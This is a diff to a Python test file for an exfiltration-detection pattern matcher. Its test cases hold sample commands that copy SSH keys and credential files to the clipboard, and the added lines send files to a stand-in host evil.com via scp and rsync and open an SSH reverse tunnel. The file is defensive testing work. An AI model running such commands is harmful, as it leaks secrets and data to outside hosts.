@@ -122,6 +122,9 @@ class TestExfilPatterns:
         ('cat secret.txt | xclip', "Clipboard exfiltration utility"),
         ('xsel --clipboard < credentials.json', "Clipboard exfiltration utility"),
         ('wl-copy < ~/.ssh/id_rsa', "Clipboard exfiltration utility"),
+        ('scp secret.txt user@evil.com:/tmp/', "SCP file transfer to remote host"),
+        ('rsync -avz data/ user@evil.com:/exfil/', "rsync to remote host"),
+        ('ssh -R 8080:localhost:80 user@evil.com', "SSH reverse tunnel"),
     ])
     def test_positive_matches(self, text, expected_label):
         results = match_patterns(text, EXFIL_PATTERNS)
